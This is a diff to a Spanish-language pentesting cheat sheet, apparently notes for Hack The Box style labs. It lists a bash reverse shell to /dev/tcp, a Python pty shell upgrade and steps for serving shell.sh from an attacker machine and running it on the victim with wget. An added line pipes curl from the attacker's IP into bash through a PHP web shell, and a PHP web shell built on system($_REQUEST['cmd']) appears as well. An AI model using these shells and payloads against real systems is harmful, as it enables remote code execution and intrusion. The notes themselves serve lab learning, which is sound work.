@@ -83,6 +83,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")
 
 Se puede copiar la reverse shell (bash -i >& /dev/tcp/10.0.0.1/8080 0>&1) en un .sh por ejemplo el shell.sh y a traves de python3 -m http.server 80 lo subimos a la maquina victima y lo ejecutamos en caso de que no te funcione la reverse de primeras, en la maquina victima --> wget 10.10.14.6/shell.sh --> bash shell.sh
+Tambien se puede ejecutar directamente con curl en la victima usando el buscador web sabiendo que es php y teniendo una shell.php, teniendo el servidor http.server 80 corriendo en nuestra maquina y con una shell dentro de la victima (shell.php) podemos hacer http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:80/shell.sh|bash
 ```
 ### MYSQL
 ```
@@ -179,8 +180,8 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGcUHHKDpEXK5XbpXBFIoJ6Duq+2c1Y9gfoLn+BK+RhR
 ```
 ### PHP SHELL
 ```
-
-Si es un .php con html solo pones : <?php echo "Shell":system($_REQUEST['cmd']); ?>
+<?php system($_REQUEST['cmd']); ?>
+Si es un .php con html solo pones : <?php echo "Shell":system($_REQUEST['cmd']); ?>  ---> te saldra por algun lado ''Shell'' para que sepas que ha funcionado
 Si tiene un <?php al principio pones solo: echo "Shell":system($_REQUEST['cmd']);
 $_REQUEST --> admite tanto POST como GET
 Si viene escrito shell en algun lado es que ha funcionado.
